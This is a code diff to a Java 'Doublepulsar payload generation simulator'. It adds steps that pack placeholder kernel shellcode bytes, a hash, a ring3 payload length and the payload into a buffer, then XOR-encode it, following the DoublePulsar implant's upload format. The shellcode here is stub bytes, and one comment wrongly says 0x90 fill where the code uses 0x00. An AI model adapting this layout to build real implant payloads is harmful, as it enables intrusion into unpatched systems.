@@ -1,6 +1,7 @@
 import java.nio.*; //import java.nio.ByteBuffer;
 import java.util.*;
-
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
 
 /*
 Doublepulsar payload generation simulator
@@ -157,5 +158,38 @@ public class DoublepulsarUploadShellcode {
         for (byte b : XorParameterBytes) {
             System.out.printf("%02X ", b);
         }
+        System.out.printf("\n");
+        
+        byte[] hMem = new byte[4096];
+        byte[] shellcode = new byte[] { (byte)0x31, (byte)0xc9, (byte)0x41 };
+        byte[] shellcodePartTwo = new byte[] { (byte)0x49, (byte)0x8b, (byte)0x1e, (byte)0x4d };
+        byte[] ring3 = new byte[200];
+        
+        int shellcodeOnePartLen = shellcode.length;
+        int shellcodePartTwoLen = shellcodePartTwo.length;
+        int ring3Len = ring3.length;
+        int kernelShellcodeSize = shellcodeOnePartLen + shellcodePartTwoLen + 4;
+        System.out.println("Total size of kernel shellcode: " + kernelShellcodeSize);
+        
+        // Fill the buffer with 0x90
+        for (int i = 0; i < hMem.length; i++) {
+            hMem[i] = (byte) 0x00;
+        }
+        System.arraycopy(shellcode, 0, hMem, 0, shellcodeOnePartLen);
+        ByteBuffer.wrap(hMem, shellcodeOnePartLen, 4).order(ByteOrder.LITTLE_ENDIAN).putInt(hash);
+        
+        // Copy the second part of the shellcode into hMem
+        System.arraycopy(shellcodePartTwo, 0, hMem, shellcodeOnePartLen + 4, shellcodePartTwoLen);
+
+        // Add the length of ring3 (converted to short) into hMem
+        ByteBuffer.wrap(hMem, kernelShellcodeSize, 2).order(ByteOrder.LITTLE_ENDIAN).putShort((short) ring3Len);
+
+        // Copy the ring3 data into hMem
+        System.arraycopy(ring3, 0, hMem, kernelShellcodeSize + 2, ring3Len);
+        
+        System.out.println("Shellcode prepared successfully.");
+        
+        byte[] XorPayload = byteXor(hMem, byteXorKey);
+        
     }
 }
